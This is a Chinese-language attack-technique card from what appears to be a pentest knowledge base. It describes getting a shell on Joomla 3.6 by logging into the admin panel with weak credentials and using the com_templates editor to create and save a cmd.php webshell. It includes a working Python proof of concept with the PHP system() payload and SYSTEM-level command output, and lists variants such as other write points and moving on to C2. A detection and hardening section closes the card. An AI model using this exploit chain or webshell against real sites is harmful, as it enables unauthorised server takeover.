---
id: web-php-rce-joomla-admin-template-editor-webshell
title: Joomla 后台 com_templates 模板编辑新建 cmd.php 写 WebShell RCE
type: scenario
domain: web
path: web/php/rce
technique: joomla-admin-template-create-file-save-webshell
aliases:
- Joomla 后台 getshell
- Joomla 模板编辑 RCE
- com_templates template.save
- Joomla 3.6 RCE
- protostar cmd.php
- Joomla 后台写 webshell
tags:
- php
- joomla
- cms
- backend
- rce
- webshell
- com_templates
- csrf-token
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V158
  verified_at: '2026-11-06T07:39:24+08:00'
  notes: 已对照原文、脚本与截图核对：Joomla 3.6.3（joomla.xml，图23），后台 admin/cslab 登录后用 CSRF token 调 template.createFile 建 cmd.php、template.save 写 <?php system($_GET['cmd']); ?>，访问 /templates/protostar/cmd.php?cmd=whoami 回显 nt authority\system（图27），与卡一致。核对修正：卡内 affected_versions 原写“Joomla 3.6.x（靶机版本；未给出修复版本）”，属目标环境版本而非原文受影响区间，已 --clear。未验证点：未本机复跑；frontmatter 无 sources/source_url。
---

## 一句话结论

登录 Joomla 后台后，`com_templates` 模板编辑器允许管理员在模板目录内新建任意文件并保存内容；依次调用 `template.createFile` 创建 `cmd.php`、`template.save` 写入 PHP 代码，再访问 `/templates/protostar/cmd.php`，即可在 Web 服务器权限下执行任意命令（靶机上为 `nt authority\system`）。

## 原理

- Joomla 后台的“模板管理 → 模板编辑”是为管理员提供的合法功能：管理员可以选择模板、新建/编辑模板内的文件（包括 `.php`），提交 `task=template.createFile` 与 `task=template.save`。
- 模板目录（如 `templates/protostar/`）位于 Web 根之下，且其中的 `.php` 文件会被 Web 服务器当作 PHP 执行。因此“能在模板目录新建 PHP 文件”等价于“能在 Web 根写 WebShell”。
- `com_templates` 的保存请求只校验 Joomla 的 CSRF token（登录页与编辑页中隐藏的 32 位随机 `name`），不校验文件扩展名、不限制目录、也不隔离模板代码与可执行 PHP；这是设计上的管理员能力，而非未授权漏洞。
- 攻击者通常先用后台弱口令（靶机为 `admin / cslab`）获得管理员会话，再用脚本解析登录页的 CSRF token 完成登录，随后解析模板编辑页的 token，提交新建与保存请求。
- 文件参数 `file` 是 Base64 编码的模板内相对路径（如 `/cmd.php`），`jform[source]` 是文件内容；保存后文件按模板目录路径直接落盘，访问即执行。
- 靶机 Joomla 运行在 IIS 上且应用池身份为 SYSTEM，因此命令执行直接得到 `nt authority\system`；Linux/Apache 环境下则为 Web 服务账号权限。

## 触发条件

- 目标为 Joomla 3.x（靶机为 3.6.x），后台 `/administrator/index.php` 可访问。
- 已获得后台管理员账号口令（弱口令、默认口令、凭据泄露等）。
- `com_templates` 组件启用，模板编辑器未被禁用，模板目录对 Web 进程可写。
- Web 服务器会执行模板目录下的 `.php` 文件（默认 `templates/<template>/` 可执行）。
- 攻击者能完成 CSRF token 解析并保持会话 Cookie。

## 利用步骤

1. 访问 `http://target/administrator/index.php`，解析登录表单中隐藏的 CSRF token（Joomla 3 的 token 是 `name` 为 32 位随机字符串、`value=1` 的隐藏 input）。
2. 提交登录：`username`、`passwd`、`option=com_users`、`task=login`、token 字段名=`1`；响应出现 `Log out` 或 `Control Panel` 即成功。
3. 访问模板列表/编辑页，取得目标模板 id（protostar 常见为 506）和新的 CSRF token。
4. 提交新建文件：`option=com_templates&task=template.createFile&id=<id>&name=cmd&type=php`，成功后模板目录出现 `cmd.php`。
5. 提交保存内容：`option=com_templates&task=template.save&id=<id>&file=<base64('/cmd.php')>&jform[source]=<?php system($_GET['cmd']); ?>`，请求中带当前 token。
6. 访问 `http://target/templates/protostar/cmd.php?cmd=whoami` 验证命令执行；随后可替换为一句话/冰蝎/哥斯拉等管理工具载荷，或直接执行命令上线 C2。

## PoC

最小化 Python 脚本（requests + BeautifulSoup）：

```python
import base64, requests
from bs4 import BeautifulSoup

def token(soup):
    for inp in soup.find_all('input', type='hidden'):
        name = inp.get('name', '')
        if len(name) == 32:
            return name
    return None

base = 'http://10.10.10.66:8080'
admin = base + '/administrator/index.php'
s = requests.Session()

# 1) 登录
soup = BeautifulSoup(s.get(admin).text, 'html.parser')
t = token(soup)
s.post(admin, data={'username': 'admin', 'passwd': 'cslab',
                    'option': 'com_users', 'task': 'login',
                    'return': '', t: '1'})

# 2) 新建 cmd.php
soup = BeautifulSoup(s.get(admin + '?option=com_templates&view=template&id=506').text, 'html.parser')
t = token(soup)
s.post(admin, data={'name': 'cmd', 'type': 'php', 'address': '',
                    'task': 'template.createFile', 'option': 'com_templates',
                    'view': 'template', 'id': '506', t: '1'})

# 3) 写入 PHP
soup = BeautifulSoup(s.get(admin + '?option=com_templates&view=template&id=506').text, 'html.parser')
t = token(soup)
b64 = base64.b64encode(b'/cmd.php').decode()
s.post(admin, data={'jform[source]': "<?php system($_GET['cmd']); ?>",
                    'task': 'template.save', 'option': 'com_templates',
                    'view': 'template', 'id': '506', 'file': b64, t: '1'})

# 4) 访问
print(requests.get(base + '/templates/protostar/cmd.php?cmd=whoami').text)
```

命令回显：

```text
nt authority\system
```

说明：模板 id、模板名（protostar）和后台路径因站点而异；脚本需按实际值调整。靶机为 Joomla 3.6.x + IIS，命令以 SYSTEM 执行。

## 变体与关联

- 变体：不新建文件，直接编辑模板中已有的 `.php`（如 `index.php`、`error.php`），保存后访问对应页面触发；或新建 `.phtml`、`.php5` 等可执行扩展名。
- 变体：`template.createFile` 被禁用时，可尝试模板上传（ZIP）、插件/模块安装、语言文件覆盖、媒体管理器上传等后台写入点。
- 变体：CSRF token 每次请求都会变化，脚本必须在每个 POST 前重新抓取；token 字段名长度固定 32 位，但字符随机。
- 变体：登录页若无 token（部分配置），可直接提交登录；若后台启用双因素，需先绕过或取得会话。
- 关联：[[web-php-rce-pbootcms-backend-siteinfo-copy-webshell]]（CMS 后台写入点落地 WebShell 的同类思路）、[[web-generic-file-upload-emlog-template-zip-header-php-rce]]（模板 ZIP 上传写 PHP）、[[web-java-framework-shiro-rememberme-two-stage-memshell-loader]]（内存马，不落盘）。
- 边界：后台强口令/双因素、模板编辑器被禁用、模板目录不可写、Web 服务器不执行模板目录 PHP、WAF 拦截含 `<?php`/`system` 的保存请求时，本链不成立。

## 检测与防御

- 检测：`/administrator/index.php` 出现弱口令登录和异常来源 IP；随后短时间内出现 `task=template.createFile`、`task=template.save` 且 `jform[source]` 含 `<?php`、`system`、`eval`、`assert`、`passthru` 等；模板目录新增 `.php` 文件（尤其 `cmd.php`、随机名文件）；访问 `/templates/<template>/<file>.php?cmd=` 的请求。
- 修复：升级 Joomla 到当前受支持版本；在“全局配置 → 权限”中禁止管理员编辑模板文件，或移除不必要的模板编辑器权限；把模板目录设为只读（部署时由构建流程写入）。
- 加固：后台使用强口令 + 双因素 + IP 白名单；文件完整性监控模板目录；WAF 拦截后台保存请求中的 PHP 标签与命令函数；Web 服务以低权限账号运行，避免应用池身份为 SYSTEM。
